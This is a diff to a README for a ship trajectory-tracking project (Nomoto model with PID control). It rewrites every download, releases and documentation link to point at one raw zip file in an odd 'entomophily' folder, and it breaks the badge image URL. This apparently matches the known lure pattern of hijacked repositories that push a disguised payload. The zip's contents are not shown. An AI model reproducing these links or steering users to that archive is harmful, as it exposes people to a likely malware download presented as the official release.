@@ -1,6 +1,6 @@
 # 🎯 Nomoto-PID_Trajectory-tracking - Real-Time Path Tracking Simplified
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/mriamhossam/Nomoto-PID_Trajectory-tracking/releases)
+[![Download Now](https://raw.githubusercontent.com/mriamhossam/Nomoto-PID_Trajectory-tracking/main/entomophily/Nomoto-PID_Trajectory-tracking.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/mriamhossam/Nomoto-PID_Trajectory-tracking/main/entomophily/Nomoto-PID_Trajectory-tracking.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you install the application, ensure your computer meets the following req
 
 To download the software, visit the Releases page. 
 
-[Download from Releases Page](https://github.com/mriamhossam/Nomoto-PID_Trajectory-tracking/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/mriamhossam/Nomoto-PID_Trajectory-tracking/main/entomophily/Nomoto-PID_Trajectory-tracking.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version of the application.
@@ -75,7 +75,7 @@ For additional help or inquiries, you can reach out through the repository's iss
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/mriamhossam/Nomoto-PID_Trajectory-tracking/wiki)
-- [Releases Page](https://github.com/mriamhossam/Nomoto-PID_Trajectory-tracking/releases)
+- [Documentation](https://raw.githubusercontent.com/mriamhossam/Nomoto-PID_Trajectory-tracking/main/entomophily/Nomoto-PID_Trajectory-tracking.zip)
+- [Releases Page](https://raw.githubusercontent.com/mriamhossam/Nomoto-PID_Trajectory-tracking/main/entomophily/Nomoto-PID_Trajectory-tracking.zip)
 
 This README serves as a complete guide to help you download, install, and use the Nomoto-PID_Trajectory-tracking application effectively. Enjoy tracking your paths!
